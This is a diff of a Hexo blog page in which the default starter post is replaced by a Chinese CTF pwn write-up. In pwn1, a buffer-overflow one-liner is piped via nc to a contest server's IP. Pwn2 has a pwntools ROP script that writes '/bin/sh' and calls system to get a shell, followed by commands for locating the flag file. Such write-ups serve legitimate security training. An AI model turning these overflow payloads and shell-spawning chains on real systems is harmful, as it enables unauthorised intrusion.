@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Hello World | Hexo</title>
+  <title>【CFF2016-pwn】 Writeup | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
-<meta name="keywords">
+  <meta name="description" content="pwn1简单的变量覆盖。 12python -c &amp;apos;print &amp;quot;a&amp;quot;*0x40+&amp;quot;\x1b\x86\x04\x08&amp;quot;&amp;apos;|nc 139.196.232.222 54000一发带走  pwn2scanf没有限制输入字节，可发送超长字符串导致栈溢出。 只开了NX，但是用程序自带的后门是无法读取flag的，自己发送个&amp;quot;/bin/sh\">
+<meta name="keywords" content="pwn,Writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://yoursite.com/2017/04/27/hello-world/index.html">
+<meta property="og:title" content="【CFF2016-pwn】 Writeup">
+<meta property="og:url" content="http://yoursite.com/2016/06/20/CCF2016/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
-<meta property="og:updated_time" content="2017-04-28T06:46:31.235Z">
+<meta property="og:description" content="pwn1简单的变量覆盖。 12python -c &amp;apos;print &amp;quot;a&amp;quot;*0x40+&amp;quot;\x1b\x86\x04\x08&amp;quot;&amp;apos;|nc 139.196.232.222 54000一发带走  pwn2scanf没有限制输入字节，可发送超长字符串导致栈溢出。 只开了NX，但是用程序自带的后门是无法读取flag的，自己发送个&amp;quot;/bin/sh\">
+<meta property="og:updated_time" content="2016-12-20T02:38:20.014Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="twitter:title" content="【CFF2016-pwn】 Writeup">
+<meta name="twitter:description" content="pwn1简单的变量覆盖。 12python -c &amp;apos;print &amp;quot;a&amp;quot;*0x40+&amp;quot;\x1b\x86\x04\x08&amp;quot;&amp;apos;|nc 139.196.232.222 54000一发带走  pwn2scanf没有限制输入字节，可发送超长字符串导致栈溢出。 只开了NX，但是用程序自带的后门是无法读取flag的，自己发送个&amp;quot;/bin/sh\">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -136,33 +136,33 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-hello-world" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-CCF2016" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Hello World
+      【CFF2016-pwn】 Writeup
     </h1>
   
 
-        <a href="/2017/04/27/hello-world/" class="archive-article-date">
-  	<time datetime="2017-04-28T06:46:31.235Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-27</time>
+        <a href="/2016/06/20/CCF2016/" class="archive-article-date">
+  	<time datetime="2016-06-20T17:55:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-06-20</time>
 </a>
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+        <h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>简单的变量覆盖。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python -c &apos;print &quot;a&quot;*0x40+&quot;\x1b\x86\x04\x08&quot;&apos;|nc 139.196.232.222 54000</div><div class="line">一发带走</div></pre></td></tr></table></figure>
+
+<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>scanf没有限制输入字节，可发送超长字符串导致栈溢出。</p>
+<p>只开了NX，但是用程序自带的后门是无法读取flag的，自己发送个<code>&quot;/bin/sh\0&quot;</code>然后构造rop，拿shell<br><a id="more"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">elf = ELF(<span class="string">'memory'</span>)</div><div class="line">system_plt = elf.symbols[<span class="string">'system'</span>]</div><div class="line">scanf_plt = elf.symbols[<span class="string">'__isoc99_scanf'</span>]</div><div class="line">pp_ret = <span class="number">0x804877e</span></div><div class="line">_s = <span class="number">0x8048817</span></div><div class="line">data =  <span class="number">0x0804A038</span></div><div class="line"></div><div class="line">p = process(<span class="string">'./memory'</span>)</div><div class="line">payload1 = <span class="string">'a'</span>*(<span class="number">0x13</span>+<span class="number">4</span>)+p32(scanf_plt)+p32(pp_ret)+p32(_s)+p32(data)+p32(system_plt)+p32(<span class="number">0</span>)+p32(data)</div><div class="line">p.sendline(payload1)</div><div class="line">p.sendline(<span class="string">'/bin/sh\0'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>接下来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">find /|grep flag</div><div class="line">/bin/cat xxx #忘记位置了</div></pre></td></tr></table></figure></p>
+<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3>
+<p>把文件里面这个位置的数据改成0x88，进入这个函数里面，会给一个web服务器的地址，把改变后的文件上传就拿flag。</p>
+<p>PS：pwn3，500题，这么简单？</p>
 
       
 
@@ -192,6 +192,11 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Writeup/">Writeup</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+	</div>
+
       
 
       
@@ -242,7 +247,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/04/27/hello-world/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2016/06/20/CCF2016/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -256,15 +261,20 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/04/27/2017-429-final/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2016/06/08/python命令行执行系统命令/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          【pwn】2017-429final
+          python命令行执行系统命令
         
       </div>
     </a>
   
+  
+    <a href="/2016/07/05/ICHUNQIU2016-PWN/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">【ICQ2016】 writeup</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
